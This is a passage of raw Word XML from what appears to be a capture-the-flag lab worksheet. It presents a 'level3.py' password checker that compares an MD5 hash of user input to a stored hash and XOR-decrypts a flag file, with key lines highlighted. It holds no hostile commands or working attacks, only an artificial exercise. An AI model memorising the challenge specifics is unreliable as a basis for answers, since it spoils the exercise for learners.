            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>hash</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too. There are 7 potential passwords with 1 being correct. You can find these by examining the password checker script.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCF1076"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cat level3.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB7703B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>hashlib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3E5980E5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AB29588" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001F28B3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>str_xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(secret, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46690789" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    #extend key to secret length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4652E890"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key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B0C3B6"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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1951106F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    while </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">) &lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(secret):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F03AC7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> + key[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0BD6EE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> = (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> + 1) % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">(key)        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D416537" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "".join([chr(</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secret_c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">) ^ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>new_key_c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>)) for (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>secret_c,new_key_c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>) in zip(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>secret,new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D4D975" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>###############################################################################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A71554" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24E9F75C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>flag_enc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> = open('level3.flag.txt.enc', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC33A1B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pP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 open('level3.hash.bin', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6298F968" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21A4F9FA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5116B493" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>hash_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>pw_str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1A538D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>pw_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>bytearray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6004347E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>pw_bytes.extend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>pw_str.encode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5EB1BF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    m = hashlib.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>md5()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D5BC68" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>m.update</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>pw_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA9E1AF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>m.digest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5943D2CF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19FB400B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D4AE9A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>def level_3_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="383B2429" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE7070B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">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hash_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D061C24" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E72878B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">if( </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> == </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>correct_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> )</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC699B8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2003E07E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        decryption = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>str_xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>flag_enc.decode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">(), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC80189" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
